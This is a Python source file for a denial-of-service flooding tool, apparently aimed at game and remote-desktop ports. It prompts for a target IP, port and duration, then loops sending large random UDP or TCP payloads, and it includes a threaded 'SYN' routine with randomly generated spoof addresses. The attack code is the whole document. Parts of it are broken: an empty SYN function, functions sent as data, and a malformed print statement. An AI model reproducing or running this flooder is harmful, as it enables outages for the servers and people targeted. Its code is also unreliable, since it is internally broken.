import socket

import os

import random

import sys

import struct

import threading

from time import time as tt

os.system('cls' if os.name == 'nt' else 'clear')

logo = """

\033[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗

\033[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝

\033[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░

\033[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░

\033[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██

\033[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝

"""

banner = """

\033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀

\033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄

\033[91m|-----------------------|

\033[91m|   TCP    | 80  | 3389 |

\033[91m|   UDP    |17091| 7777 |

\033[91m|   SYN    | 80  | 3389 |

\033[91m|----------|------------|

"""

print(logo)

print(banner)

method = str(input("Method (TCP, UDP, SYN) : "))

def UDP():

    ip = str(input("IP : "))

    port = int(input("Port : "))

    time = int(input("Time : "))

    data = random._urandom(20179)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    addr = (str(ip),int(port))

    startup = tt()

    while True:

        endtime = tt()

        if (startup + time) < endtime:

            break

        s.sendto(data, addr)

def TCP():

    ip = str(input("IP : "))

    port = int(input("Port : "))

    time = int(input("Time : "))

    data = random._urandom(20179)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    addr = (str(ip),int(port))

    startup = tt()

    while True:

        endtime = tt()

        if (startup + time) < endtime:

            break

        s.sendto(data, addr)

  

def SYN():

def randproxy():

    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))

    return ip

def randport():

    port = random.randint(1000,9000)

    return port

ip = str(input("\nenter ip target > "))

port = int(input("port address > "))

times = int(input("times ? > "))

threads = int(input("how many threads you want ? > "))

def ddos():

     while True:

          o = ["!", "+", "=", "-", "/"]

          i = random.choice(o)

          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

          s.connect((ip, port))

          try:

               s.send(randproxy)

               s.send(randport)

               print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {}".format(ip))

          except ConnectionAbortedError:

               s.close()

               print(print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {} > DOWN".format(ip)))

if __name__ == "__main__":

     th = threading.Thread(target=ddos)

     th.start()

 

if __name__ == '__main__':

	print(logo)	print(banner)

	try:

		if method == 'TCP':

			TCP()

		elif method == 'UDP':

			UDP()

		elif method == 'SYN':

		  SYN()

		else:

			print("Unknow method: %s" % method)

	except KeyboardInterrupt:

		print("\033[32mAttack stopped.")
